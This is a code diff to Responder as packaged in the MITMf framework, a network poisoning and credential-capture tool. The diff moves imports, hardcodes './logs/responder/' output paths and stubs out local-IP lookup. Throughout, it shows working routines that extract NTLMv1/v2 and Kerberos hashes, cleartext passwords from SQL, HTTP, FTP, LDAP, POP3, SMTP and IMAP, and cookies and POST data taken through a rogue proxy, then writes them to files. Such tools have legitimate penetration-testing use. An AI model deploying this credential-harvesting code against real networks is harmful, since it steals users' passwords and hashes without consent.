@@ -21,6 +21,15 @@ from Fingerprint import RunSmbFinger,OsNameClientVersion
 from odict import OrderedDict
 from socket import inet_aton
 from random import randrange
+from SMBPackets import *
+from SQLPackets import *
+from RAPLANMANPackets import *
+from HTTPPackets import *
+from HTTPProxy import *
+from LDAPPackets import *
+from SMTPPackets import *
+from IMAPPackets import *
+from OpenSSL import SSL
 
 import sys
 import struct
@@ -401,7 +410,6 @@ class NB(BaseRequestHandler):
 ##################################################################################
 #Browser Listener and Lanman Finger
 ##################################################################################
-from RAPLANMANPackets import *
 
 def WorkstationFingerPrint(data):
 	Role = {
@@ -573,7 +581,6 @@ class Browser(BaseRequestHandler):
 ##################################################################################
 #SMB Server
 ##################################################################################
-from SMBPackets import *
 
 #Detect if SMB auth was Anonymous
 def Is_Anonymous(data):
@@ -665,7 +672,7 @@ def ParseSMBHash(data,client):
 		UserOffset = struct.unpack('<H',data[115:117])[0]
 		User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
 		writehash = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal
-		outfile = os.path.join(ResponderPATH,"SMB-NTLMv1ESS-Client-"+client+".txt")
+		outfile = "./logs/responder/SMB-NTLMv1ESS-Client-"+client+".txt"
 		if PrintData(outfile,User+"::"+Domain):
 			#print "[+]SMB-NTLMv1 hash captured from : ",client
 			#print "[+]SMB complete hash is :", writehash
@@ -673,7 +680,7 @@ def ParseSMBHash(data,client):
 		responder_logger.info('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))
 
 	if NthashLen > 60:
-		outfile = os.path.join(ResponderPATH,"SMB-NTLMv2-Client-"+client+".txt")
+		outfile = "./logs/responder/SMB-NTLMv2-Client-"+client+".txt"
 		NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
 		DomainLen = struct.unpack('<H',data[109:111])[0]
 		DomainOffset = struct.unpack('<H',data[111:113])[0]
@@ -698,7 +705,7 @@ def ParseLMNTHash(data,client):
 		if NthashLen > 25:
 			Hash = data[65+LMhashLen:65+LMhashLen+NthashLen]
 			responder_logger.info('[+]SMB-NTLMv2 hash captured from :%s'%(client))
-			outfile = os.path.join(ResponderPATH,"SMB-NTLMv2-Client-"+client+".txt")
+			outfile = "./logs/responder/SMB-NTLMv2-Client-"+client+".txt"
 			pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
 			var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
 			Username, Domain = tuple(var)
@@ -711,7 +718,7 @@ def ParseLMNTHash(data,client):
 			responder_logger.info('[+]SMB-NTLMv2 complete hash is :%s'%(Writehash))
 		if NthashLen == 24:
 			responder_logger.info('[+]SMB-NTLMv1 hash captured from :%s'%(client))
-			outfile = os.path.join(ResponderPATH,"SMB-NTLMv1-Client-"+client+".txt")
+			outfile = "./logs/responder/SMB-NTLMv1-Client-"+client+".txt"
 			pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
 			var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
 			Username, Domain = tuple(var)
@@ -978,11 +985,11 @@ class KerbTCP(BaseRequestHandler):
 			data = self.request.recv(1024)
 			KerbHash = ParseMSKerbv5TCP(data)
 			if KerbHash:
-				Outfile = os.path.join(ResponderPATH,"MSKerberos-Client-"+self.client_address[0]+".txt")
+				Outfile = "./logs/responder/MSKerberos-Client-"+self.client_address[0]+".txt"
 				if PrintData(Outfile,KerbHash):
 					#print "[+]MSKerbv5 hash captured from : ", self.client_address[0]
 					#print "[+]MSKerbv5 complete hash is :", KerbHash
-					Outfile = os.path.join(ResponderPATH,"MSKerberos-Client-"+self.client_address[0]+".txt")
+					Outfile = "./logs/responder/MSKerberos-Client-"+self.client_address[0]+".txt"
 					WriteData(Outfile,KerbHash, KerbHash)
 					responder_logger.info('[+]MSKerbv5 complete hash is :%s'%(KerbHash))
 		except Exception:
@@ -995,11 +1002,11 @@ class KerbUDP(BaseRequestHandler):
 			data, soc = self.request
 			KerbHash = ParseMSKerbv5UDP(data)
 			if KerbHash:
-				Outfile = os.path.join(ResponderPATH,"MSKerberos-Client-"+self.client_address[0]+".txt")
+				Outfile = "./logs/responder/MSKerberos-Client-"+self.client_address[0]+".txt"
 				if PrintData(Outfile,KerbHash):
 					#print "[+]MSKerbv5 hash captured from : ", self.client_address[0]
 					#print "[+]MSKerbv5 complete hash is :", KerbHash
-					Outfile = os.path.join(ResponderPATH,"MSKerberos-Client-"+self.client_address[0]+".txt")
+					Outfile = "./logs/responder/MSKerberos-Client-"+self.client_address[0]+".txt"
 					WriteData(Outfile,KerbHash, KerbHash)
 					responder_logger.info('[+]MSKerbv5 complete hash is :%s'%(KerbHash))
 		except Exception:
@@ -1008,7 +1015,6 @@ class KerbUDP(BaseRequestHandler):
 ##################################################################################
 #SQL Stuff
 ##################################################################################
-from SQLPackets import *
 
 #This function parse SQL NTLMv1/v2 hash and dump it into a specific file.
 def ParseSQLHash(data,client):
@@ -1026,7 +1032,7 @@ def ParseSQLHash(data,client):
 		UserLen = struct.unpack('<H',data[44:46])[0]
 		UserOffset = struct.unpack('<H',data[48:50])[0]
 		User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
-		outfile = os.path.join(ResponderPATH,"MSSQL-NTLMv1-Client-"+client+".txt")
+		outfile = "./logs/responder/MSSQL-NTLMv1-Client-"+client+".txt"
 		if PrintData(outfile,User+"::"+Domain):
 			#print "[+]MSSQL NTLMv1 hash captured from :",client
 			#print '[+]MSSQL NTLMv1 Complete hash is: %s'%(User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal)
@@ -1045,7 +1051,7 @@ def ParseSQLHash(data,client):
 		UserLen = struct.unpack('<H',data[44:46])[0]
 		UserOffset = struct.unpack('<H',data[48:50])[0]
 		User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
-		outfile = os.path.join(ResponderPATH,"MSSQL-NTLMv2-Client-"+client+".txt")
+		outfile = "./logs/responder/MSSQL-NTLMv2-Client-"+client+".txt"
 		Writehash = User+"::"+Domain+":"+NumChal+":"+Hash[:32].upper()+":"+Hash[32:].upper()
 		if PrintData(outfile,User+"::"+Domain):
 			#print "[+]MSSQL NTLMv2 Hash captured from :",client
@@ -1064,7 +1070,7 @@ def ParseSqlClearTxtPwd(Pwd):
 	return ''.join(Pw)
 
 def ParseClearTextSQLPass(Data,client):
-	outfile = os.path.join(ResponderPATH,"MSSQL-PlainText-Password-"+client+".txt")
+	outfile = "./logs/responder/MSSQL-PlainText-Password-"+client+".txt"
 	UsernameOffset = struct.unpack('<h',Data[48:50])[0]
 	PwdOffset = struct.unpack('<h',Data[52:54])[0]
 	AppOffset = struct.unpack('<h',Data[56:58])[0]
@@ -1176,10 +1182,7 @@ def IsOnTheSameSubnet(ip, net):
 	return (ipaddr & mask) == (netaddr & mask)
 
 def FindLocalIP(Iface):
-	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	s.setsockopt(socket.SOL_SOCKET, 25, Iface+'\0')
-	s.connect(("127.0.0.1",9))#RFC 863
-	return s.getsockname()[0]
+	return OURIP
 
 # LLMNR Server class.
 class LLMNR(BaseRequestHandler):
@@ -1452,8 +1455,6 @@ class MDNS(BaseRequestHandler):
 ##################################################################################
 #HTTP Stuff
 ##################################################################################
-from HTTPPackets import *
-from HTTPProxy import *
 
 #Parse NTLMv1/v2 hash.
 def ParseHTTPHash(data,client):
@@ -1471,7 +1472,7 @@ def ParseHTTPHash(data,client):
 		UserLen = struct.unpack('<H',data[36:38])[0]
 		UserOffset = struct.unpack('<H',data[40:42])[0]
 		User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
-		outfile = os.path.join(ResponderPATH,"HTTP-NTLMv1-Client-"+client+".txt")
+		outfile = "./logs/responder/HTTP-NTLMv1-Client-"+client+".txt"
 		WriteHash = User+"::"+Hostname+":"+LMHash+":"+NtHash+":"+NumChal
 		if PrintData(outfile,User+"::"+Hostname):
 			#print "[+]HTTP NTLMv1 hash captured from :",client
@@ -1494,7 +1495,7 @@ def ParseHTTPHash(data,client):
 		HostNameLen = struct.unpack('<H',data[44:46])[0]
 		HostNameOffset = struct.unpack('<H',data[48:50])[0]
 		HostName =  data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
-		outfile = os.path.join(ResponderPATH,"HTTP-NTLMv2-Client-"+client+".txt")
+		outfile = "./logs/responder/HTTP-NTLMv2-Client-"+client+".txt"
 		WriteHash = User+"::"+Domain+":"+NumChal+":"+NTHash[:32]+":"+NTHash[32:]
 		if PrintData(outfile,User+"::"+Domain):
 			#print "[+]HTTP NTLMv2 hash captured from :",client
@@ -1634,7 +1635,7 @@ def PacketSequence(data,client):
 	if BasicAuth:
 		GrabCookie(data,client)
 		GrabURL(data,client)
-		outfile = os.path.join(ResponderPATH,"HTTP-Clear-Text-Password-"+client+".txt")
+		outfile = "./logs/responder/HTTP-Clear-Text-Password-"+client+".txt"
 		if PrintData(outfile,b64decode(''.join(BasicAuth))):
 			#print "[+]HTTP-User & Password:", b64decode(''.join(BasicAuth))
 			WriteData(outfile,b64decode(''.join(BasicAuth)), b64decode(''.join(BasicAuth)))
@@ -1812,7 +1813,7 @@ class ProxyHandler (BaseHTTPServer.BaseHTTPRequestHandler):
 					Message = "Requested URL: %s\nComplete Cookie: %s\nClient IP is: %s\n"%(self.path, Cookie, self.client_address[0])
 					if Verbose == True:
 						print Message
-					OutFile = os.path.join(ResponderPATH,"HTTPCookies/HTTP-Cookie-request-"+netloc+"-from-"+self.client_address[0]+".txt")
+					OutFile = "./logs/responder/HTTPCookies/HTTP-Cookie-request-"+netloc+"-from-"+self.client_address[0]+".txt"
 					WriteData(OutFile,Message, Message)
 					self.headers['Connection'] = 'close'
 					del self.headers['Proxy-Connection']
@@ -1857,7 +1858,7 @@ class ProxyHandler (BaseHTTPServer.BaseHTTPRequestHandler):
 							Message = "POST data was: %s\n"%(data)
 							if Verbose == True:
 								print Message
-							OutFile = os.path.join(ResponderPATH,"HTTPCookies/HTTP-Cookie-request-"+netloc+"-from-"+self.client_address[0]+".txt")
+							OutFile = "./logs/responder/HTTPCookies/HTTP-Cookie-request-"+netloc+"-from-"+self.client_address[0]+".txt"
 							WriteData(OutFile,Message, Message)
 					if data:
 						try:
@@ -1879,7 +1880,6 @@ class ProxyHandler (BaseHTTPServer.BaseHTTPRequestHandler):
 ##################################################################################
 #HTTPS Server
 ##################################################################################
-from OpenSSL import SSL
 #Parse NTLMv1/v2 hash.
 def ParseHTTPSHash(data,client):
 	LMhashLen = struct.unpack('<H',data[12:14])[0]
@@ -1902,7 +1902,7 @@ def ParseHTTPSHash(data,client):
 		User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
 		#print "User is :", data[UserOffset:UserOffset+UserLen].replace('\x00','')
 		responder_logger.info('[+]HTTPS NTLMv1 User is :%s'%(data[UserOffset:UserOffset+UserLen].replace('\x00','')))
-		outfile = os.path.join(ResponderPATH,"HTTPS-NTLMv1-Client-"+client+".txt")
+		outfile = "./logs/responder/HTTPS-NTLMv1-Client-"+client+".txt"
 		WriteHash = User+"::"+Hostname+":"+LMHash+":"+NtHash+":"+NumChal
 		WriteData(outfile,WriteHash, User+"::"+Hostname)
 		#print "Complete hash is : ", WriteHash
@@ -1926,7 +1926,7 @@ def ParseHTTPSHash(data,client):
 		HostName =  data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
 		#print "Hostname is :", HostName
 		responder_logger.info('[+]HTTPS NTLMv2 Hostname is :%s'%(HostName))
-		outfile = os.path.join(ResponderPATH,"HTTPS-NTLMv2-Client-"+client+".txt")
+		outfile = "./logs/responder/HTTPS-NTLMv2-Client-"+client+".txt"
 		WriteHash = User+"::"+Domain+":"+NumChal+":"+NTHash[:32]+":"+NTHash[32:]
 		WriteData(outfile,WriteHash, User+"::"+Domain)
 		#print "Complete hash is : ", WriteHash
@@ -1953,7 +1953,7 @@ def HTTPSPacketSequence(data,client):
 			return buffer1
 	if b:
 		GrabCookie(data,client)
-		outfile = os.path.join(ResponderPATH,"HTTPS-Clear-Text-Password-"+client+".txt")
+		outfile = "./logs/responder/HTTPS-Clear-Text-Password-"+client+".txt"
 		WriteData(outfile,b64decode(''.join(b)), b64decode(''.join(b)))
 		#print "[+]HTTPS-User & Password:", b64decode(''.join(b))
 		responder_logger.info('[+]HTTPS-User & Password: %s'%(b64decode(''.join(b))))
@@ -2026,7 +2026,7 @@ class FTP(BaseRequestHandler):
 				data = self.request.recv(1024)
 			if data[0:4] == "PASS":
 				Pass = data[5:].replace("\r\n","")
-				Outfile = os.path.join(ResponderPATH,"FTP-Clear-Text-Password-"+self.client_address[0]+".txt")
+				Outfile = "./logs/responder/FTP-Clear-Text-Password-"+self.client_address[0]+".txt"
 				WriteData(Outfile,User+":"+Pass, User+":"+Pass)
 				#print "[+]FTP Password is: ", Pass
 				responder_logger.info('[+]FTP Password is: %s'%(Pass))
@@ -2043,7 +2043,6 @@ class FTP(BaseRequestHandler):
 ##################################################################################
 #LDAP Stuff
 ##################################################################################
-from LDAPPackets import *
 
 def ParseSearch(data):
 	Search1 = re.search('(objectClass)', data)
@@ -2072,7 +2071,7 @@ def ParseLDAPHash(data,client):
 		UserOffset = struct.unpack('<H',data[82:84])[0]
 		User = SSPIStarts[UserOffset:UserOffset+UserLen].replace('\x00','')
 		writehash = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal
-		Outfile = os.path.join(ResponderPATH,"LDAP-NTLMv1-"+client+".txt")
+		Outfile = "./logs/responder/LDAP-NTLMv1-"+client+".txt"
 		WriteData(Outfile,writehash,User+"::"+Domain)
 		#print "[LDAP] NTLMv1 complete hash is :", writehash
 		responder_logger.info('[LDAP] NTLMv1 complete hash is :%s'%(writehash))
@@ -2107,7 +2106,7 @@ def ParseLDAPPacket(data,client):
 				PassLen = struct.unpack('<b',data[20+UserDomainLen+1:20+UserDomainLen+2])[0]
 				Password = data[20+UserDomainLen+2:20+UserDomainLen+2+PassLen]
 				#print '[LDAP]Clear Text User & Password is:', UserDomain+":"+Password
-				outfile = os.path.join(ResponderPATH,"LDAP-Clear-Text-Password-"+client+".txt")
+				outfile = "./logs/responder/LDAP-Clear-Text-Password-"+client+".txt"
 				WriteData(outfile,'[LDAP]User: %s Password: %s'%(UserDomain,Password),'[LDAP]User: %s Password: %s'%(UserDomain,Password))
 				responder_logger.info('[LDAP]User: %s Password: %s'%(UserDomain,Password))
 			if sasl == "\xA3":
@@ -2157,7 +2156,7 @@ class POP(BaseRequestHandler):
 				data = self.request.recv(1024)
 			if data[0:4] == "PASS":
 				Pass = data[5:].replace("\r\n","")
-				Outfile = os.path.join(ResponderPATH,"POP3-Clear-Text-Password-"+self.client_address[0]+".txt")
+				Outfile = "./logs/responder/POP3-Clear-Text-Password-"+self.client_address[0]+".txt"
 				WriteData(Outfile,User+":"+Pass, User+":"+Pass)
 				#print "[+]POP3 Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],User,Pass)
 				responder_logger.info("[+]POP3 Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],User,Pass))
@@ -2174,7 +2173,6 @@ class POP(BaseRequestHandler):
 ##################################################################################
 #ESMTP Stuff
 ##################################################################################
-from SMTPPackets import *
 
 #ESMTP server class.
 class ESMTP(BaseRequestHandler):
@@ -2195,7 +2193,7 @@ class ESMTP(BaseRequestHandler):
 					data = self.request.recv(1024)
 					if data:
 						Password = b64decode(data[:len(data)-2])
-						Outfile = os.path.join(ResponderPATH,"SMTP-Clear-Text-Password-"+self.client_address[0]+".txt")
+						Outfile = "./logs/responder/SMTP-Clear-Text-Password-"+self.client_address[0]+".txt"
 						WriteData(Outfile,Username+":"+Password, Username+":"+Password)
 						#print "[+]SMTP Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],Username,Password)
 						responder_logger.info("[+]SMTP Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],Username,Password))
@@ -2206,7 +2204,6 @@ class ESMTP(BaseRequestHandler):
 ##################################################################################
 #IMAP4 Stuff
 ##################################################################################
-from IMAPPackets import *
 
 #ESMTP server class.
 class IMAP(BaseRequestHandler):
@@ -2222,7 +2219,7 @@ class IMAP(BaseRequestHandler):
 				data = self.request.recv(1024)
 			if data[5:10] == "LOGIN":
 				Credentials = data[10:].strip()
-				Outfile = os.path.join(ResponderPATH,"IMAP-Clear-Text-Password-"+self.client_address[0]+".txt")
+				Outfile = "./logs/responder/IMAP-Clear-Text-Password-"+self.client_address[0]+".txt"
 				WriteData(Outfile,Credentials, Credentials)
 				#print '[+]IMAP Credentials from %s. ("User" "Pass"): %s'%(self.client_address[0],Credentials)
 				responder_logger.info('[+]IMAP Credentials from %s. ("User" "Pass"): %s'%(self.client_address[0],Credentials))
@@ -2511,8 +2508,6 @@ class ResponderMITMf():
 		global WPAD_Script; WPAD_Script = config['HTTP Server']['WPADScript']
 		#HTMLToServe = config.get('HTTP Server', 'HTMLToServe')
 
-		global ResponderPATH; ResponderPATH = "./logs/responder"
-
 		global SSLcert; SSLcert = config['HTTPS Server']['cert']
 		global SSLkey; SSLkey = config['HTTPS Server']['key']
 
@@ -2547,7 +2542,7 @@ class ResponderMITMf():
 		global Force_WPAD_Auth; Force_WPAD_Auth = options.Force_WPAD_Auth
 		global AnalyzeMode; AnalyzeMode = options.Analyse
 		global INTERFACE; INTERFACE = "Not set"
-		global BIND_TO_Interface; BIND_TO_Interface = "ALL"
+		global BIND_TO_Interface; BIND_TO_Interface = "ALL" 
 
 	def AnalyzeICMPRedirect(self):
 		result = False
@@ -2579,6 +2574,7 @@ class ResponderMITMf():
 
 	def printDebugInfo(self):
 		start_message = "|  |_ Responder will redirect requests to: %s\n" % OURIP
+	   #start_message += "|  |_ Responder is bound to interface: %s\n" % INTERFACE
 		start_message += "|  |_ Challenge set: %s\n" % NumChal
 		start_message += "|  |_ WPAD Proxy Server: %s\n" % WPAD_On_Off
 	   #start_message += "|  |_ WPAD script loaded: %s\n" % WPAD_Script
